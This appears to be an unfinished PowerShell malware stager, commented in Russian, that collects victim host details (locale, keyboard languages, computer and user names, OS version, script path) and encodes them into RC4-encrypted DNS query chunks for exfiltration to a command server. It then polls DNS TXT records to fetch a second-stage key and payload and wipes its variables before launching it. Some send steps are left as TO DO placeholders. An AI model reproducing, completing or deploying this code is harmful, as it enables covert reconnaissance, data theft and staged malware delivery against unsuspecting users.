


function Invoke-Stager1 {param($ip, $build, $key)

	#
	# вспомогательные функции
	#

	# RC4 code/decode
	function RC4 {Param($D,$K)
		$S=0..255;$J=0;$L=$K.Length;
		0..255|%{$J=($J+$S[$_]+$K[$_%$L])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$I=$J=0;
		ForEach($X in $D){$I=($I+1)%256;$J=($J+$S[$I])%256;$S[$I],$S[$J]=$S[$J],$S[$I];$X-bxor$S[($S[$I]+$S[$J])%256];}
	}

	# раскладывает хекс строку в массив байт
	function hexstr2bytes {param($str)
		$len = $str.Length;
		$bytes = new-object byte[] ($len/2);
		for($i=0; $i -lt $len; $i += 2){ 
			$bytes[$i/2]=[convert]::ToByte($str.Substring($i,2),16) 
		}
		$bytes;
	}

	# dns_send - отправка ответа на управляющий сервер посредством DNS запроса A
	function dns_send {param(
		$ip,
		$domain,
		[UInt32]$build_id,
		[UInt32]$session_id,
		[UInt16]$command_id,
		[UInt32]$module_id,
		[string]$data,
		[string]$key
		)

		# длина данных
		$len = $data.Length;
		# размер блока = 100, но в хекс будет x2
		$bsize = 100*2;
		# кол-во пакетов c полным размером блока
		$count =[Math]::Floor($len / $bsize);
		# остаток
		$remainder = $len % $bsize;
		# общее число пакетов
		$total = $count;
		# +1 пакет с остатком, или это единственный пакет
		if ($remainder){ $total++ };
	
		<# 
		формирование START блока (старт блок не шифруется, т.к. содержит только hex-числа)
	
		ANSWER PACKET START
		packet_number = 0x0000
		data_size = 1 byte
		data - ...
	
		формат поля data:
	
		$build_id = 4 byte - зашито в скрипт
		session_id = 3 byte - 
		command_id = 1 byte - приходит с командой и возвращается как ответ на эту команду
		module_id = 4 byte - ID модуля кому предназначена команда (приходит с командой и возвращается как ответ на эту команду) может быть 0, зависит от команды
		packets_count = 4 byte - ожидаемое число пакетов для приема
	
		#>
		$build_id_x = [String]::Format("{0:X8}", $build_id);
		$session_id_x = [String]::Format("{0:X6}", $session_id);
		$command_id_x = [String]::Format("{0:X4}", $command_id);
		$module_id_x = [String]::Format("{0:X8}", $module_id);
		$packets_count = [String]::Format("{0:X8}", [UInt32]$total);
		# порядок присваивания может быть перемешан мутатором в любом порядке
	
		$buffer = $build_id_x + $session_id_x + $command_id_x + $module_id_x + $packets_count;
		$start_url = "0000" + ([String]::Format("{0:X2}", $buffer.Length)) + $buffer;
		$start_url += $domain;
		$start_url
		# отправка START
		#$result = Resolve-DnsName -Name github.com -type A -Server 8.8.8.8;
		#
		# TO DO

		# шифр
		$enc = [System.Text.Encoding]::UTF8;
		$buffer = $Enc.GetBytes($data);
		$k = $Enc.GetBytes($key);
		$rc4 = [System.BitConverter]::ToString((RC4 $buffer $k)) -replace '-','';
	
		<#
		ANSWER PACKET (промежуточный пакет отправки)
		packet_number = 2 byte (1..N)
		data_size = 1 byte
		data = 1..100

		total size(hex str): 8..206 bytes
		#>
	
		# счетчик пакетов
		$i=1; $count++;
	
		# отправка блоков >1
		# сюда никогда не зайдет, если блок единственный
		for($i; $i -lt $count; $i++)
		{
			$chunk = $rc4.Substring($i * $bsize, $bsize);
		
			# формирование блока
			$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
			$packet_url+= $domain;
			
			# отправка
			#
			# TO DO
		}
	
		# отправка остаточного блока (или единственного)
		if ($remainder)
		{
			$chunk = $rc4.Substring($len - $remainder);
		
			# формирование блока
			$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
			$packet_url+= $domain;
			$packet_url
			# отправка
			#
			# TO DO
		}
	
		<# 
		формирование END блока (END блок не шифруется, т.к. содержит только hex-числа и sha1)
	
		ANSWER PACKET END
		packet_number = 0xFFFF
		data_size = 1 byte - длина sha1 хеша всегда 20 байт, что в хекс строке = 40 байт = 0x28 можно записать без вычислений
		data - sha1 от массива байт RC4 buffer (ВНИМАНИЕ не от хекс строки!! иначе не сойдутся хеши)
		#>
		$sha1 = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA1CryptoServiceProvider).ComputeHash($Enc.GetBytes($rc4))) -replace '-','';
		$end_url = "FFFF28" + $sha1;
		$end_url  += $domain;
		$end_url
	
		# отправка END
		#
		#
		#
	}

	#
	# STAGER1 START
	#
	
	#0. инициализация рабочих данных
	$ErrorActionPreference="SilentlyContinue";
	$enc = [System.Text.Encoding]::UTF8;
	$SKB=$enc.GetBytes($key);
	
	# генерация session ID (3 bytes)
	$sid = -join("ABCDEF0123456789".ToCharArray()|Get-Random -Count 3);
	# генерация рандомного короткого домена (4 символа) для днс запросов этой сессии
	$domain = -join("abcdefghklmnprstuvwxyz".ToCharArray()|Get-Random -Count 4) + ".com";
	
	#1. сбор сис.инфы и отправка на сервер (DNS_TYPE_A)
	$wlng=(Get-WinSystemLocale).Name;
	$kb_a=(Get-CimInstance -ClassName Win32_OperatingSystem).MUILanguages; 
	$c=$kb_a.Length; 
	for ($i=0; $i -le $c; $i++){ if ($kb_a[$i]){$kb += $kb_a[$i] + " "} }
	$win=(Get-CimInstance -ClassName Win32_OperatingSystem).Version;
	$arch="x86"; if ([IntPtr]::Size -eq 8) { $arch += "-64" };
	$path=$PSCommandPath;
	$file=0;
	if ($path) { $file = Split-Path $path -leaf }
	
	# формат
	#язык системы|язык клавиатуры|имя компа|имя юзера|версия ОСи|рязрядность ОСи|путь|имя файла
	$i=$wlng+'|'+$kb+'|'+$env:COMPUTERNAME+'|'+$env:USERNAME+'|'+$win+'|'+$arch+'|'+$path+'|'+$file
	
	$i
	
	
	#dns_send $ip $domain $build $sid 0 0 $i $key;
	
	<#
	url (TXT) генерируется следующим образом
	RND.SESSION_ID.REQUEST.SESSION_DOMAIN (пример 1757382062.380.01.kfvp.com)
	
	REQUEST - это тип запроса (01 - ключ stager2 / 10 - stager2)
	по нему сервер определит запрашиваемые данные
	
	TO DO :: обсудить этот момент
	#>
	
	#2. ожидание приема ключа stager2 (DNS_TYPE_TXT) 01
	# ключ может и не прийти, может быть команда на выход.
	$S2key = "";
	while($S2key.Length -eq 0)
	{
		Start-Sleep -Seconds 3
		$url = (Get-Random).ToString() + "." + $sid + ".01." + $domain;
		#$url
		#$buf = Resolve-DnsName -Name $url -type TXT -Server $ip | Select-Object -ExpandProperty Strings;
		$buf = Resolve-DnsName -Name "github.com" -type TXT -Server $ip | Select-Object -ExpandProperty Strings;
		
		# TO DO :: определить как будут приходить данные от сервера (при наличии сервера)
#		$buf.Length
#		if ($buf[1].Length -ne 0)
#		{
#			$buf[1]
#		}
#		else
#		{
#			Write-Host "no TXT data..."
#		}
	}
	
	#3. ожидание приема stager2 (DNS_TYPE_TXT) 10
	$S2 = "";
	while($S2.Length -eq 0)
	{
		Start-Sleep -Seconds 3
		$url = (Get-Random).ToString() + "." + $sid + ".10." + $domain;
		$buf = Resolve-DnsName -Name $url -type TXT -Server $ip | Select-Object -ExpandProperty Strings;
		# TO DO ....
	}
	
	#4. расшифровка и инициализация stager2
	# TO DO - чем в итоге расшифровываем ????? xor или aes или еще что-то
	
	#5. очистка всех переменных и юзаемой памяти перед запуском
	$sid=$null;$domain=$null;$wlng=$null;$kb_a=$null;$kb=$null;$win=$null;$arch=$null;$path=$null;$file=$null;$i=$null;
	$S2key=$null;$SKB=$null;$buf=$null;$url=$null;$S2$null;
	[GC]::Collect();
	
	#6. start stager2
	# TO DO - запуск по формату функции (ее еще нету)
	# будет типа такого
	# Invoke-Stager2 -параметры ....
}

Invoke-Stager1 -ip "8.8.8.8" -build "1234" -key "xyz"
